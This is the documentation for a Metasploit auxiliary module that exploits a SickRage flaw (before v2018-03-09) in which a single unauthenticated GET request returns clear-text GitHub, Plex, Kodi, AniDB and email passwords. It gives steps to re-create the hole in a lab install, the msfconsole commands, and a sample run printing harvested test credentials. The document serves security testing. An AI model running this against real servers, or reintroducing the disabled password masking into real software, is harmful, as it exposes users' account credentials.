## Description
  
 This module exploits a vulnerability in SickRage for versions under v2018-03-09. A simple GET request will return clear-text credentials for Github, Kodi, Plex, AniDB, etc. This exploit will only work if the user has not set credentials for the SickRage application. By default, SickRage credentials are not set.

## Vulnerable Application

  SickRage < v2018-03-09

### Installation and Setup

  The vulnerable versions of SickRage are no longer accessible, but the latest release can be made vulnerable with a few changes.
  The latest SickRage release for Windows can be found [here](https://github.com/SickRage/SickRageInstaller/releases).

## Verification Steps

  1.   Install the application
  2.   Navigate to `C:\SickRage\SickRage\gui\slick\views`
  3.   Open `config_general.mako`
  4.   Find the input element with the name `git_password`
  5.   Change the value from `${sickbeard.GIT_PASSWORD|hide}` to `${sickbeard.GIT_PASSWORD}`
  6.   Save the changes
  7.   Open `config_anime.mako`
  8.   Find the input element with the name `anidb_password`
  9.   Change the value from `${sickbeard.ANIDB_PASSWORD|hide}` to `${sickbeard.ANIDB_PASSWORD}`
  10.  Save the changes
  11.  Open `config_notifications.mako`
  12.  Find the input element with the name `kodi_password`
  13.  Change the value from `${sickbeard.KODI_PASSWORD|hide}` to `${sickbeard.KODI_PASSWORD}`
  14.  Find the input element with the name `plex_server_password`
  15.  Change the value from `${sickbeard.PLEX_SERVER_PASSWORD|hide}` to `${sickbeard.PLEX_SERVER_PASSWORD}`
  16.  Find the input element with the name `plex_client_password`
  17.  Change the value from `${sickbeard.PLEX_CLIENT_PASSWORD|hide}` to `${sickbeard.PLEX_CLIENT_PASSWORD}`
  18.  Find the input element with the name `email_password`
  19.  Change the value from `${sickbeard.EMAIL_PASSWORD|hide}` to `${sickbeard.EMAIL_PASSWORD}`
  20.  Save the changes
  21.  Start SickRage
  22.  Start msfconsole
  23.  Do: `use [auxiliary/scanner/http/http_sickrage_password_leak]`
  24.  Do: `set RHOSTS [IP]`
  25.  Do: `run`
  26.  The credentials that the user has set should be printed to the screen

## Scenarios

### Tested on Windows 7 x86

  ```
  msf5 > use auxiliary/scanner/http/http_sickrage_password_leak
  msf5 auxiliary(scanner/http/http_sickrage_password_leak) > set RHOSTS 192.168.37.130
  RHOSTS => 192.168.37.130
  msf5 auxiliary(scanner/http/http_sickrage_password_leak) > run

  [+] git username: myUsername
  [+] git password: myPassword
  [+] anidb username: anidb
  [+] anidb password: anidbpass
  [+] plex_server username: plexu
  [+] plex_server password: plexp
  [+] plex_client username: plextu
  [+] plex_client password: plextp
  [+] Email username: sickrage@sickrage.com
  [+] Email password: sickragepass
  [*] Auxiliary module execution completed
  msf5 auxiliary(scanner/http/http_sickrage_password_leak) >
  ```
